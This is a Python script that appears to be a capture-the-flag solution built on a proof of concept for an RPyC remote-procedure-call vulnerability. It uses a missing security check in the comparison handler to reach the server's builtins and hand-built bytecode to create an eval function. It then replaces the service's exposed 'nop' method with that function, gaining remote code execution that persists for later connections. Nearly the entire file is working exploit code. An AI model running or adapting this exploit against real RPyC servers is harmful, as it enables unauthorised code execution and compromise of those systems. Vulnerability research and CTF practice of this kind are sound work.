import rpyc
import subprocess
import os

HOST = 'socat - openssl:pike-d313ec827560d6dc.mc.ax:1'
HOST = HOST.split(":")[-2]
# HOST = "localhost"
if HOST == "localhost":
    PORT = 9999
else:
    PORT = 1


def setattr_orig(target, attrname, codeobj):
    setattr(target, attrname, codeobj)


def myeval(self=None, cmd="__import__('sys')"):
    return eval(cmd)


def get_code(obj_codetype, func, filename=None, name=None):
    func_code = func.__code__
    arg_names = ['co_argcount', 'co_posonlyargcount', 'co_kwonlyargcount', 'co_nlocals', 'co_stacksize', 'co_flags',
                 'co_code', 'co_consts', 'co_names', 'co_varnames', 'co_filename', 'co_name', 'co_firstlineno',
                 'co_lnotab', 'co_freevars', 'co_cellvars']

    codetype_args = [getattr(func_code, n) for n in arg_names]
    if filename:
        codetype_args[arg_names.index('co_filename')] = filename
    if name:
        codetype_args[arg_names.index('co_name')] = name

    # if PORT == 1 or 1 == 1:
    #     print(codetype_args)
    #     codetype_args[11] = "server.py"
    #     codetype_args[12] = "__code__"
    #     codetype_args[13] = 13
    #     codetype_args[14] = b'\x00\x01'
    #     codetype_args[15] = b'\x00\x01'
    #     codetype_args += [()]
    #     # codetype_args += ()
    #     print(codetype_args)
    codetype_args = [2, 0, 0, 2, 3, 3, b'\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00',
                     (None,), ('eval',), ('self', 'cmd'), 'server.py', 'server.py', '__code__', 13, b'\x00\x01', b'\x00\x01', ()]
    mycode = obj_codetype(*codetype_args)
    return mycode


def _vercmp_gt(ver1, ver2):
    ver1_gt_ver2 = False
    for i, v1 in enumerate(ver1):
        v2 = ver2[i]
        if v1 > v2:
            ver1_gt_ver2 = True
            break
        elif v1 == v2:
            continue
        else:  # v1 < v2
            break
    return ver1_gt_ver2


class fuck():
    conn = None

    def setUpClass(self):
        if PORT == 1:
            self.conn = rpyc.ssl_connect(HOST, port=PORT)
        else:
            self.conn = rpyc.connect(HOST, port=PORT)

    def netref_getattr(self, netref, attrname):
        # PoC CWE-358: abuse __cmp__ function that was missing a security check
        handler = rpyc.core.consts.HANDLE_CMP
        return self.conn.sync_request(handler, netref, attrname, '__getattribute__')

    def test_1_modify_nop(self):
        # create netrefs for builtins and globals that will be used to construct on remote
        remote_svc_proto = self.netref_getattr(self.conn.root, '_protocol')
        remote_dispatch = self.netref_getattr(
            remote_svc_proto, '_dispatch_request')
        remote_class_globals = self.netref_getattr(
            remote_dispatch, '__globals__')
        remote_modules = self.netref_getattr(
            remote_class_globals['sys'], 'modules')
        _builtins = remote_modules['builtins']
        remote_builtins = {k: self.netref_getattr(
            _builtins, k) for k in dir(_builtins)}

        # populate globals for CodeType calls on remote
        remote_globals = remote_builtins['dict']()
        for name, netref in remote_builtins.items():
            remote_globals[name] = netref
        for name, netref in self.netref_getattr(remote_modules, 'items')():
            # print("Running...")
            remote_globals[name] = netref

        # create netrefs for types to create remote function malicously
        remote_types = remote_builtins['__import__']("types")
        remote_types_CodeType = self.netref_getattr(remote_types, 'CodeType')
        remote_types_FunctionType = self.netref_getattr(
            remote_types, 'FunctionType')

        # remote eval function constructed
        remote_eval_codeobj = get_code(
            remote_types_CodeType, myeval, filename='server.py', name='__code__')
        remote_eval = remote_types_FunctionType(
            remote_eval_codeobj, remote_globals)
        # PoC CWE-913: modify the exposed_nop of service
        #   by binding various netrefs in this execution frame, they are cached in
        #   the remote address space. setattr and eval functions are cached for the life
        #   of the netrefs in the frame. A consequence of Netref classes inheriting
        #   BaseNetref, each object is cached under_local_objects. So, we are able
        #   to construct arbitrary code using types and builtins.

        # use the builtin netrefs to modify the service to use the constructed eval func
        remote_setattr = remote_builtins['setattr']
        remote_type = remote_builtins['type']
        remote_setattr(remote_type(self.conn.root), 'exposed_nop', remote_eval)

        # show that nop was replaced by eval to complete the PoC
        # remote_sys = self.conn.root.nop('__import__("sys")')
        # remote_stack = self.conn.root.nop(
        #     '"".join(__import__("traceback").format_stack())')
        # self.assertEqual(type(remote_sys).__name__, 'builtins.module')
        # self.assertIsInstance(remote_sys, rpyc.core.netref.BaseNetref)
        # self.assertIn('rpyc/utils/server.py', remote_stack)

    def test_2_new_conn_impacted(self):
        # demostrate impact and scope of vuln for new connections
        self.conn.close()
        self.conn = rpyc.ssl_connect(HOST, port=PORT)
        # self.conn = rpyc.connect(HOST, port=PORT)
        # show new conn can still use nop as eval
        remote_sys = self.conn.root.nop('__import__("sys")')
        remote_stack = self.conn.root.nop(
            '"".join(__import__("traceback").format_stack())')
        self.assertEqual(type(remote_sys).__name__, 'builtins.module')
        self.assertIsInstance(remote_sys, rpyc.core.netref.BaseNetref)
        self.assertIn('rpyc/utils/server.py', remote_stack)


if __name__ == "__main__":
    a = fuck()
    a.setUpClass()
    a.test_1_modify_nop()
